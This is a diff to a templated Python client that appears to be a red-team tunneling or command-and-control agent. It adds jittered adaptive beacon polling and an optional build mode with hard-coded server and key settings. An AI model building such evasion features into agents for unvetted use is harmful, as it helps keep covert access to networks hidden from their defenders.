@@ -1,9 +1,14 @@
+{% if not no_arg_parsing %}
 import argparse
+{% endif %}
 import asyncio
 import base64
 import errno
 import hashlib
 import os
+{% if not no_adaptive_polling %}
+import random
+{% endif %}
 import secrets
 import ssl
 import struct
@@ -11,10 +16,6 @@ import socket
 import string
 import sys
 
-{% if no_print %}
-sys.stdout = open(os.devnull, 'w')
-sys.stderr = open(os.devnull, 'w')
-{% endif %}
 
 from collections import namedtuple
 from urllib import request
@@ -936,6 +937,13 @@ class HTTPClient(Client):
 
     async def start(self):
         await self.readvertise_forwarders()
+        {% if not no_adaptive_polling %}
+        _poll_delay = 0.1
+        _POLL_MIN = 0.1
+        _POLL_MAX = 10.0
+        _POLL_FACTOR = 1.5
+        _POLL_JITTER = 0.2
+        {% endif %}
         while not self.killed:
             if not self._pending:
                 while not self.upstream_messages.empty() and len(self._pending) < MAX_BATCH_SIZE:
@@ -954,7 +962,13 @@ class HTTPClient(Client):
             resp = await loop.run_in_executor(None, self._blocking_http_req, req, 15.0)
             if not resp:
                 self._pending.clear()
+                {% if not no_adaptive_polling %}
+                _poll_delay = min(_poll_delay * _POLL_FACTOR, _POLL_MAX)
+                _jittered = _poll_delay * (1.0 - _POLL_JITTER + random.random() * 2 * _POLL_JITTER)
+                await asyncio.sleep(_jittered)
+                {% else %}
                 await asyncio.sleep(0.1)
+                {% endif %}
                 continue
 
             self._pending.clear()
@@ -962,9 +976,21 @@ class HTTPClient(Client):
             if any(isinstance(m, CheckOutMessage) for m in messages):
                 self.handle_checkout()
                 break
+            {% if not no_adaptive_polling %}
+            _real_msgs = sum(1 for m in messages if not isinstance(m, (CheckInMessage, CheckOutMessage)))
+            if _real_msgs > 0:
+                _poll_delay = _POLL_MIN
+            else:
+                _poll_delay = min(_poll_delay * _POLL_FACTOR, _POLL_MAX)
+            {% endif %}
             for message in messages:
                 await self.dispatch_message(message)
+            {% if not no_adaptive_polling %}
+            _jittered = _poll_delay * (1.0 - _POLL_JITTER + random.random() * 2 * _POLL_JITTER)
+            await asyncio.sleep(_jittered)
+            {% else %}
             await asyncio.sleep(0.1)
+            {% endif %}
 
     async def send_upstream_message(self, upstream_message):
         await self.upstream_messages.put(upstream_message)
@@ -1060,11 +1086,12 @@ def generate_hash(hash_input: str) -> bytes:
     hasher.update(hash_input)
     return hasher.digest()
 
+{% if not no_arg_parsing %}
 def parse_args():
     parser = argparse.ArgumentParser(description="Client")
 
     parser.add_argument("--server-url", help="Server URL to connect to")
-    parser.add_argument("--encryption-key", help="AES encryption key")
+    parser.add_argument("-e", "--encryption-key", help="AES encryption key")
     parser.add_argument("--user-agent", help="Custom User-Agent string")
     parser.add_argument("--proxy", help="Proxy URL")
     parser.add_argument("--retry-duration", type=float, help="Total time to retry connecting")
@@ -1075,8 +1102,10 @@ def parse_args():
         print(f'[!] Could not find argument `{arg}`.')
     return args
 
+{% endif %}
 
 async def main():
+    {% if not no_arg_parsing %}
     args = parse_args()
 
     server_url = args.server_url or SERVER_URL
@@ -1097,6 +1126,14 @@ async def main():
         if args.retry_attempts is not None
         else RETRY_ATTEMPTS
     )
+    {% else %}
+    server_url = SERVER_URL
+    encryption_key = generate_hash(ENCRYPTION_KEY)
+    user_agent = USER_AGENT
+    proxy = PROXY
+    retry_duration = RETRY_DURATION
+    retry_attempts = RETRY_ATTEMPTS
+    {% endif %}
 
     if proxy and not proxy.startswith('http'):
         proxy = f'http://{proxy}'
@@ -1112,14 +1149,13 @@ async def main():
     for i, attempt in enumerate(attempts, 1):
         candidate_url = f"{attempt}://{remainder}"
         if "ws" in attempt and ws:
-            print(f'[*] Attempting to connect over {attempt.upper()} ({i}/{len(attempts)})')
             client = WSClient(candidate_url, encryption_key, user_agent, proxy)
         elif "http" in attempt:
-            print(f'[*] Attempting to connect over {attempt.upper()} ({i}/{len(attempts)})')
             client = HTTPClient(candidate_url, encryption_key, user_agent, proxy)
         else:
             print(f"[!] Unsupported scheme: {attempt}")
             continue
+        print(f'[*] Attempting to connect over {attempt.upper()} to {candidate_url} ({i}/{len(attempts)})')
         try:
             await client.connect()
             print(f'[+] Connected to {candidate_url}')
@@ -1157,7 +1193,7 @@ async def main():
         consecutive_failures = 0
         while consecutive_failures < retry_attempts:
             consecutive_failures += 1
-            print(f'[*] Attempting to reconnect (attempt {consecutive_failures}/{retry_attempts})')
+            print(f'[*] Attempting to reconnect ({consecutive_failures}/{retry_attempts})')
             await asyncio.sleep(sleep_time)
             try:
                 await client.connect()
